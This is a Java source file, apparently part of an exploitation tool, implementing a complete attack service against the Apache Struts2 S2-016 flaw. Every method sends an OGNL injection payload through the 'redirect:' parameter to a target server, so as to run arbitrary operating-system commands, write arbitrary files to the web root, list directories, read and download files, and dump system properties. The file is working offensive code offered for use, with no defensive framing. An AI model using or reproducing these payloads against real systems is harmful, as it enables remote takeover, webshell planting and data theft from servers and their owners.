package org.vti.service.impl;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;

import org.vti.service.ExploitService;
import org.vti.util.RequestUtil;

public class Struts2_S016_ExploitServiceImpl implements ExploitService{
	
	@Override
	public String getRealPath(String uri) throws Exception{
		String commandURL =URLEncoder.encode("${#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')," +
				"#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')," +
				"#resp.getWriter().println(#req.getRealPath(\"/\"))," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close()}","UTF8");
		
		String requestURL = uri+ "?redirect:" + commandURL;
		
		StringBuffer buf=new StringBuffer("\u7269\u7406\u5730\u5740\uff1a");
		
		buf.append(RequestUtil.getInstance().doRequest(requestURL));
		
		return buf.toString();
	}
	
	@Override
	public Map<String, String> getServerInfo(String uri,Map<String, String>properties) throws Exception {
		
		Map<String, String>echo=new LinkedHashMap<String,String>();
		
		for (Entry<String, String> entry:properties.entrySet()) {
			
			String commandURL =URLEncoder.encode("${#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')," +
					"#_memberAccess['allowStaticMethodAccess']=true," +
					"#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')," +
					"#pro=@java.lang.System@getProperty(\""+entry.getValue()+"\")," +
					"#resp.getWriter().println(#pro)," +
					"#resp.getWriter().flush()," +
					"#resp.getWriter().close()}","UTF8");
			
			String requestURL =uri+ "?redirect:" + commandURL;
			
			echo.put(entry.getKey(),RequestUtil.getInstance().doRequest(requestURL));
		}
		return echo;
	}

	@Override
	public String doExecuteCMD(String uri, String cmd) throws Exception {
		
		String arrays[]=cmd.split(" ");
		
		if (arrays.length==1) {
			cmd="'"+arrays[0]+"'";
		}else {
			String str="";
			for (int i = 0; i < arrays.length; i++) {
				str+="'"+arrays[i]+"',";
			}
			str=str.substring(0,str.length()-1);
			cmd=str;
		}
		
		
		String commandURL =URLEncoder.encode("${#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')," +
				"#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')," +
				"#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"+cmd+"})).start()," +
				"#s=new java.util.Scanner(#a.getInputStream()).useDelimiter(\"\\\\A\")," +
				"#msg=(#s.hasNext() ? #s.next() : \"\"),"+
				"#resp.getWriter().println(#msg)," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close()}","UTF8");
		
		
		String requestURL =uri+ "?redirect:" + commandURL;
		
		BufferedReader reader=new BufferedReader(new InputStreamReader(RequestUtil.getInstance().getInputStream(requestURL)));
		
		String str="";
		while (reader.ready()) {
			str+=reader.readLine()+"\r\n";
		}
		return str;
	}

	@Override
	public boolean doUpload(String uri, String fileName, String content)
			throws Exception {
		
		fileName="/"+fileName;
		content=content.replace("\"","\\\"");
		
		String commandURL =URLEncoder.encode("${#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')," +
				"#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')," +
				"#path=#req.getRealPath(\"/\")," +
				"#content=new java.lang.String(\""+content+"\")," +
				"#file=new java.io.File(#path +\""+fileName+"\")," +
				"#fos=new java.io.FileOutputStream(#file)," +
				"#fos.write(#content.getBytes())," +
				"#fos.flush()," +
				"#fos.close()," +
				"#resp.getWriter().println(\"ok\")," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close()}","UTF8");
		
		String requestURL =uri+ "?redirect:" + commandURL;
		
		String message=RequestUtil.getInstance().doRequest(requestURL);
		
		if (message.equals("ok")) {
			return true;
		}else {
			return false;
		}
	}
	

	@Override
	public boolean doCustomUplaod(String uri, String filePath, String content)
			throws Exception {
		
		content=content.replace("\"","\\\"");
		
		String commandURL =URLEncoder.encode("${#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')," +
				"#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')," +
				"#path=new java.lang.String(\""+filePath.trim()+"\")," +
				"#content=new java.lang.String(\""+content+"\")," +
				"#file=new java.io.File(#path)," +
				"#fos=new java.io.FileOutputStream(#file)," +
				"#fos.write(#content.getBytes())," +
				"#fos.flush()," +
				"#fos.close()," +
				"#resp.getWriter().println(\"ok\")," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close()}","UTF8");
		
		String requestURL =uri+ "?redirect:" + commandURL;
		
		String message=RequestUtil.getInstance().doRequest(requestURL);
		
		if (message.equals("ok")) {
			return true;
		}else {
			return false;
		}
	}

	@Override
	public List<String> doGetFileSystem(String uri) throws Exception {
		
		String commandURL =URLEncoder.encode("${#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')," +
				"#_memberAccess['allowStaticMethodAccess']=true," +
				"#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')," +
				"#sys=@java.io.File@listRoots()," +
				"#resp.getWriter().println(#sys.length)," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close()}","UTF8");
		
		String requestURL =uri+ "?redirect:" + commandURL;
		
		int size=Integer.valueOf(RequestUtil.getInstance().doRequest(requestURL));
		
		List<String>list=new ArrayList<>();
		
		for (int i = 0; i <size; i++) {
			
			String diskCmdURL =URLEncoder.encode("${#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')," +
					"#_memberAccess['allowStaticMethodAccess']=true," +
					"#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')," +
					"#sys=@java.io.File@listRoots()," +
					"#resp.getWriter().println(#sys["+i+"])," +
					"#resp.getWriter().flush()," +
					"#resp.getWriter().close()}","UTF8");
			
			String diskURL =uri+ "?redirect:" + diskCmdURL;
			
			String diskName= RequestUtil.getInstance().doRequest(diskURL);
			
			list.add(diskName);
		}
		return list;
	}

	@Override
	public List<String> doListFiles(String uri, String path)
			throws Exception {
		
		String commandURL =URLEncoder.encode("${#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')," +
				"#_memberAccess['allowStaticMethodAccess']=true," +
				"#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')," +
				"#file=new java.io.File(\""+path+"\")," +
				"#resp.getWriter().println(#file.listFiles().length)," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close()}","UTF8");
		
		String requestURL =uri+ "?redirect:" + commandURL;
		
		int size=Integer.valueOf(RequestUtil.getInstance().doRequest(requestURL));
			
		List<String>list=new ArrayList<>();
		
		for (int i = 0; i <size; i++) {
			
			String diskCmdURL =URLEncoder.encode("${#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')," +
					"#_memberAccess['allowStaticMethodAccess']=true," +
					"#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')," +
					"#file=new java.io.File(\""+path+"\")," +
					"#resp.getWriter().println(#file.listFiles()["+i+"].getName())," +
					"#resp.getWriter().flush()," +
					"#resp.getWriter().close()}","UTF8");
			
			String diskURL =uri+ "?redirect:" + diskCmdURL;
			
			String diskName= RequestUtil.getInstance().doRequest(diskURL);
			
			list.add(diskName);
		}
		return list;
	}

	@Override
	public String doGetFileContent(String uri, String path) throws Exception {
		
		String commandURL =URLEncoder.encode("${#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')," +
				"#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')," +
				"#file=new java.io.File(\""+path+"\")," +
				"#dis=new java.io.DataInputStream(new java.io.FileInputStream(#file)),"+
				"#lenth=#file.length(),"+
				"#buf=new byte[#lenth]," +
				"#dis.readFully(#buf),"+
				"#dis.close(),"+
				"#resp.getOutputStream().write(#buf)," +
				"#resp.getOutputStream().flush()," +
				"#resp.getOutputStream().close()}","UTF8");

		String requestURL =uri+ "?redirect:" + commandURL;
		
		InputStream inputStream=RequestUtil.getInstance().getInputStream(requestURL);
		
		BufferedReader reader=new BufferedReader(new InputStreamReader(inputStream));
		
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str+"\r\n");
		}
		reader.close();
		
		return buf.toString();
	}

	@Override
	public boolean doIsDirectory(String uri, String path) throws Exception {
		
		String commandURL =URLEncoder.encode("${#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')," +
				"#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')," +
				"#file=new java.io.File(\""+path+"\")," +
				"#resp.getWriter().println(#file.isDirectory())," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close()}","UTF8");

		String requestURL =uri+ "?redirect:" + commandURL;
		
		return Boolean.parseBoolean(RequestUtil.getInstance().doRequest(requestURL));
		
	}

	@Override
	public InputStream doDownload(String uri, String rpath)
			throws Exception {
		
		String commandURL =URLEncoder.encode("${#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')," +
				"#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')," +
				"#file=new java.io.File(\""+rpath+"\")," +
				"#dis=new java.io.DataInputStream(new java.io.FileInputStream(#file)),"+
				"#lenth=#file.length(),"+
				"#buf=new byte[#lenth]," +
				"#dis.readFully(#buf),"+
				"#dis.close(),"+
				"#resp.getOutputStream().write(#buf)," +
				"#resp.getOutputStream().flush()," +
				"#resp.getOutputStream().close()}","UTF8");
		
		String requestURL =uri+ "?redirect:" + commandURL;
		
		return RequestUtil.getInstance().getInputStream(requestURL);
	}

	
}
